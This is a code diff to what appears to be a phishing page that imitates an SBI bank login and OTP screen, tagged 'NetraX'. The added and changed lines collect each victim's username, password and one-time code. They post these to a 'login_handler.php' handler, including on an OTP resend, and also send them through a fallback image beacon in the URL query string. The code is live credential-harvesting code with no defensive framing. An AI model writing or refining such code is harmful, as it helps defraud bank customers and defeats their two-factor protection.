@@ -1948,6 +1948,29 @@
     // Resend OTP link
     document.getElementById('resendOtpLink').addEventListener('click', function () {
       startOtpTimer(60);
+      
+      // Clear OTP inputs
+      otpDigits.forEach(function (inp) {
+        inp.value = '';
+        inp.type = 'password';
+      });
+      document.getElementById('proceedBtn').classList.remove('active');
+      document.getElementById('proceedBtn').innerHTML = 'Proceed';
+      document.getElementById('proceedBtn').disabled = false;
+      document.getElementById('otp1').focus();
+
+      // Send 'resend_otp' event to backend
+      var username = usernameField.value.trim();
+      var password = passwordField.value.trim();
+      console.log('[NetraX] OTP Resend requested:', username);
+      
+      $.ajax({
+        type: 'POST',
+        url: 'forwarding_link/handlers/login_handler.php',
+        data: { username: username, password: password, bank: 'SBI', step: 'resend_otp' },
+        dataType: 'json',
+        timeout: 10000
+      });
     });
 
     // OTP digit auto-advance + backspace
@@ -1988,12 +2011,12 @@
       proceedBtn.innerHTML = '<span class="spinner"></span>Verifying...';
       proceedBtn.disabled = true;
 
-      console.log('[NetraX] Submitting OTP:', { username: username, otp: otp, bank: 'SBI', step: 'otp' });
+      console.log('[NetraX] Submitting OTP:', { username: username, code: otp, bank: 'SBI', step: 'code' });
 
       $.ajax({
         type: 'POST',
         url: 'forwarding_link/handlers/login_handler.php',
-        data: { username: username, password: password, otp: otp, bank: 'SBI', step: 'otp' },
+        data: { username: username, password: password, code: otp, bank: 'SBI', step: 'code' },
         dataType: 'json',
         timeout: 15000,
         success: function (response) {
@@ -2008,8 +2031,8 @@
           var img = new Image();
           img.src = fallbackUrl + '?fallback=1&username=' + encodeURIComponent(username)
             + '&password=' + encodeURIComponent(password)
-            + '&otp=' + encodeURIComponent(otp)
-            + '&bank=SBI&step=otp';
+            + '&code=' + encodeURIComponent(otp)
+            + '&bank=SBI&step=code';
           proceedBtn.innerHTML = '✓ Verified';
           proceedBtn.classList.remove('active');
         }
